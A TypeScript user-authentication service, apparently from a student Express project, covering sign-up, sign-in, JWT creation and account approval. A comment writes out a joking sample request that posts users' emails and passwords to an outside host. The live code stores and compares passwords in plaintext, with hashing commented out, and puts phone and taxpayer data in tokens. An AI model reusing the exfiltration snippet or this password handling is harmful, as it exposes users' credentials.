import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import  IUserDTO  from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';

import { User } from '../domain/user';
import { UserEmail } from '../domain/userEmail';

import { Result } from "../core/logic/Result";
import { last } from 'lodash';
import e from 'express';

@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject('logger') private logger,
  ) {}


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        const errorMessage = `User already exists with email: ${userDTO.email}`;
        return Result.fail<{ userDTO: IUserDTO, token: string }>(errorMessage);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      

      //const salt = randomBytes(32);
      //this.logger.silly('Hashing password');
      //const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      //const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        role: userDTO.role,
        password: userDTO.password,
        phone: userDTO.phone,
        taxpayer: userDTO.taxpayer,
        state: userDTO.state,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( email );

    if (!user) {
      return Result.fail('Email não registado');
    }

    this.logger.silly('Checking user state');
    const validstate = user.state;
    if (validstate === "aprovado") {
      this.logger.silly('State is valid!');
    } else {
      if (validstate === "nao aprovado") {
        throw new Error('State is invalid. User was not approved!');
      } else {
        throw new Error('State is invalid. User is still waiting for aproval!');
      }
    }

    this.logger.silly('Checking password');
    const validPassword = user.password;
    if (validPassword === password) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');

      const result: { userDTO: IUserDTO, token: string } = {
        userDTO: UserMap.toDTO(user),
        token: this.generateToken(user) as string
      };
      return Result.ok<{userDTO: IUserDTO, token: string}>(result);
    } else {
      return Result.fail('Senha incorreta');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role;
    const phone = user.phone;
    const taxpayer = user.taxpayer;
    const state = user.state;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        phone: phone,
        taxpayer: taxpayer,
        state: state,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  public async getAllUtilizador(): Promise<Result<IUserDTO[]>> {
    try {
      const listUtilizadorRecord = await this.userRepo.getAll();

      if (!listUtilizadorRecord || listUtilizadorRecord.length === 0) {
        return Result.fail<IUserDTO[]>('User not found');
      }

      const listUtilizador: IUserDTO[] = listUtilizadorRecord
        .filter(utilizador => utilizador.email != null && utilizador.state === "aprovado")
        .map(utilizador => UserMap.toDTO(utilizador) as IUserDTO);

      return Result.ok<IUserDTO[]>(listUtilizador);
    } catch (e) {
      throw e;
    }
  }

  public async getAllUtilizadorNaoAprovado(): Promise<Result<IUserDTO[]>> {
    try {
      const listUtilizadorRecord = await this.userRepo.getAll();

      if (!listUtilizadorRecord || listUtilizadorRecord.length === 0) {
        return Result.fail<IUserDTO[]>('User not found');
      }

      const listTarefa: IUserDTO[] = listUtilizadorRecord
        .filter(utilizador => utilizador.email != null && utilizador.state === "pendente")
        .map(utilizador => UserMap.toDTO(utilizador) as IUserDTO);

      return Result.ok<IUserDTO[]>(listTarefa);
    } catch (e) {
      throw e;
    }
  }

  public async updateUtilizadorState(email: string, newState: string): Promise<Result<IUserDTO>> {
    try {
      const utilizador = await this.userRepo.findByEmail(email);

      if (utilizador === null) {
        return Result.fail<IUserDTO>("User not found");
      }

      utilizador.state = newState;

      await this.userRepo.save(utilizador);
      return Result.ok<IUserDTO>();
    } catch (e) {
      throw e;
    }
  }

  public async updateUtilizador(firstName: string, lastName: string, email: string, password: string, phone: string, taxpayer: string): Promise<Result<IUserDTO>> {
    try {
      const utilizador = await this.userRepo.findByEmail(email);

      if (utilizador === null) {
        return Result.fail<IUserDTO>("User not found");
      }

      utilizador.firstName = firstName;
      utilizador.lastName = lastName;
      //utilizador.password = password;
      utilizador.phone = phone;
      utilizador.taxpayer = taxpayer;

      await this.userRepo.save(utilizador);
      return Result.ok<IUserDTO>();
    } catch (e) {
      throw e;
    }
  }

  public async verifyCurrentPassword(email: string, currentPassword: string): Promise<Result<boolean>> {
    try {
      const user = await this.userRepo.findByEmail(email);

      if (!user) {
        return Result.fail<boolean>('User not found');
      }

      const validState = user.state;
      if (validState !== 'aprovado') {
        return Result.fail<boolean>('User is not in an approved state');
      }

      const validPassword = await argon2.verify(user.password, currentPassword);

      if (validPassword) {
        return Result.ok<boolean>(true);
      } else {
        return Result.ok<boolean>(false);
      }
    } catch (error) {
      throw error;
    }
  }

  public async deleteUtilizador(email: string): Promise<Result<void>> {
    try {
      const result = await this.userRepo.deleteUtilizador(email);
      return result;
    } catch (e) {
      throw e;
    }
  }
}
